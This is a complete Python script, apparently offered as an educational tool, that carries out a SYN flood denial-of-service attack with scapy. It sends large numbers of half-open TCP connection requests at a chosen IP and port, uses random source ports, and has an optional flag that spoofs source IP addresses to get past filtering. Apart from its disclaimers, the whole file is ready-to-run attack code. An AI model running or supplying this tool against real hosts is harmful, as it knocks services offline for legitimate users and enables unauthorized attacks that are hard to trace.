#!/usr/bin/env python3
"""
SYN Flood Attack Tool — Educational / Lab Use Only

Sends a large number of TCP SYN packets to the target without completing
the three-way handshake.  This fills the target's connection table with
half-open connections, preventing legitimate users from connecting.

How it works:
  1. Crafts TCP packets with SYN flag set (flags="S")
  2. Uses random source ports to avoid simple filtering
  3. Optionally spoofs source IP (if --spoof is used)
  4. Target allocates resources for each SYN but never gets ACK

Usage:
  sudo python3 syn_flood.py <target_ip> [options]

Requires: scapy, root/sudo privileges
"""

import argparse
import random
import signal
import sys
import time

# Graceful exit on Ctrl+C
signal.signal(signal.SIGINT, lambda *_: (print("\nStopped."), sys.exit(0)))


def syn_flood(target_ip: str, target_port: int, count: int, rate: int, spoof: bool):
    """Send SYN flood packets to the target."""
    try:
        from scapy.all import IP, TCP, send, RandShort, RandIP  # type: ignore
    except ImportError:
        print("Error: scapy not installed. Run: pip install scapy")
        sys.exit(1)

    print(f"[SYN FLOOD] Target: {target_ip}:{target_port}")
    print(f"[SYN FLOOD] Packets: {count}, Rate: {rate}/sec, Spoof: {spoof}")
    print("[SYN FLOOD] Press Ctrl+C to stop\n")

    sent = 0
    start = time.time()
    delay = 1.0 / rate if rate > 0 else 0

    for i in range(count):
        src_ip = str(RandIP()) if spoof else None
        src_port = random.randint(1024, 65535)

        if src_ip:
            pkt = IP(src=src_ip, dst=target_ip) / TCP(
                sport=src_port, dport=target_port, flags="S", seq=random.randint(0, 2**32 - 1)
            )
        else:
            pkt = IP(dst=target_ip) / TCP(
                sport=src_port, dport=target_port, flags="S", seq=random.randint(0, 2**32 - 1)
            )

        send(pkt, verbose=False)
        sent += 1

        if sent % 100 == 0:
            elapsed = time.time() - start
            pps = sent / elapsed if elapsed > 0 else 0
            print(f"  Sent {sent}/{count} packets ({pps:.0f} pps)")

        if delay > 0:
            time.sleep(delay)

    elapsed = time.time() - start
    print(f"\n[DONE] Sent {sent} SYN packets in {elapsed:.1f}s ({sent / elapsed:.0f} pps)")


def main():
    parser = argparse.ArgumentParser(
        description="SYN Flood — Educational DDoS Testing Tool",
        epilog="⚠️  FOR AUTHORIZED LAB/EDUCATIONAL USE ONLY",
    )
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-c", "--count", type=int, default=10000, help="Number of packets (default: 10000)")
    parser.add_argument("-r", "--rate", type=int, default=500, help="Packets per second (default: 500)")
    parser.add_argument("--spoof", action="store_true", help="Spoof random source IPs")

    args = parser.parse_args()
    syn_flood(args.target, args.port, args.count, args.rate, args.spoof)


if __name__ == "__main__":
    main()
